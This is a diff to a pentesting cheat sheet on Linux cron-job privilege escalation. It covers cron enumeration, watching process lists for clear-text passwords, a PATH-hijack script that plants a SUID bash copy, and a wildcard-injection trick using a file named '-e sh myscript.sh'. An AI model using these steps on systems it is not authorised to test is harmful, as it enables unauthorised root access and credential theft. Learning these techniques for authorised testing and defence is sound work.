@@ -21,6 +21,9 @@ crontab -l -u username
 #Directly cat files
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 
+#From logs
+cat /var/log/syslog | grep "CRON"
+
 #In /etc/ and subfolders
 cat /etc/crontab
 cat /etc/cron*/*
@@ -32,13 +35,19 @@ cat /var/spool/cron/crontabs/*
 {% endtab %}
 
 {% tab title="Monitor" %}
-By using [**pspy**](https://github.com/DominicBreuker/pspy), you can fetch processes without root privileges. It can be useful to detect cron jobs
+By using [**pspy**](https://github.com/DominicBreuker/pspy), you can fetch processes without root privileges. It can be useful to detect cron jobs.
 
 ```bash
 # -p: print commands to stdout
 # -f: print file system events to stdout
 # -i: interval in milliseconds
 ./pspy64 -pf -i 1000
+```
+
+It is also possible to monitor processes using the `watch` command. For example, we can grep on all occurrences of the word "pass". We may find clear-text credentials like that.
+
+```bash
+watch -n 1 "ps -ef | grep pass"
 ```
 {% endtab %}
 {% endtabs %}
@@ -49,7 +58,7 @@ By using [**pspy**](https://github.com/DominicBreuker/pspy), you can fetch proce
 {% tab title="Enumerate" %}
 For example, inside _/etc/crontab_ you can find the PATH: `PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
 
-We need to check if we have **permissions** to write on each path, if a the binary in the cron job is specified without the full command path, we&#x20;
+We need to check if we have **permissions** to write on each path, if a the binary in the cron job is specified without the full command path, we may be able to exploit it. &#x20;
 
 ```bash
 $ cat /etc/crontab
@@ -77,9 +86,10 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/path-exploit.sh
 chmod +x /home/user/path-exploit.sh
 ```
 
-Then wait for the job to execute.
+Then wait for the job to execute.&#x20;
 
 ```bash
+# Run SUID Shell after exploit
 /tmp/bash -p
 ```
 {% endtab %}
@@ -89,7 +99,7 @@ Then wait for the job to execute.
 
 {% tabs %}
 {% tab title="Enumerate" %}
-If a cron job script executed by root has a **`*`** inside a command, you may be able to exploit it.&#x20;
+If a cron job script running as root contains an `*` inside a command, then you may be able to exploit it.
 
 ```bash
 $ cat /etc/crontab
@@ -102,7 +112,7 @@ PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 {% endtab %}
 
 {% tab title="Exploit" %}
-In the previous case, we can exploit it like this
+The exploit will depend of the binary. Using the previous example, we can use following commands to exploit it.
 
 ```bash
 touch "-e sh myscript.sh"
